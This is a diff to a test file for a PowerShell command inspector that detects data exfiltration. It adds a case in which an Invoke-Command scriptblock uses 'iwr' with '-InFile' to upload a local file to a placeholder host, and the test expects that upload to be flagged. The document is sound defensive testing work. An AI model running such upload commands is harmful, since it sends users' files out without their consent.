@@ -95,10 +95,15 @@ describe("PowerShell static scope boundaries", () => {
     expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/upload sink \(invoke-restmethod -InFile\)/);
   });
 
-  // Script-block invocations open a scope or depend on runtime; a control body inside one is declined with it.
+  it("retains an upload floor in a bound literal command scriptblock", () => {
+    expect(inspectPowerShellCommand("Invoke-Command -ScriptBlock { iwr https://x.invalid -InFile notes.txt }", CWD))
+      .toMatchObject({ outcome: "visible-floor", sensitive: null, exfiltration: expect.any(String) });
+  });
+
+  // Other script-block scopes remain outside the literal invocation binding.
   it.each([
     "Get-ChildItem | ForEach-Object { BODY }", "Get-ChildItem | foreach { BODY }", "Get-ChildItem | Where-Object { BODY }",
-    ". { BODY }", "& { BODY }", "Invoke-Command -ScriptBlock { BODY }", "$b = { BODY }",
+    ". { BODY }", "& { BODY }", "$b = { BODY }",
     "& { if ($true) { BODY } }", "Get-ChildItem | ForEach-Object { foreach ($f in 1) { BODY } }",
     "if ($true) { & { BODY } }",
   ])("declines a literal upload in the script block %s", (form) => {
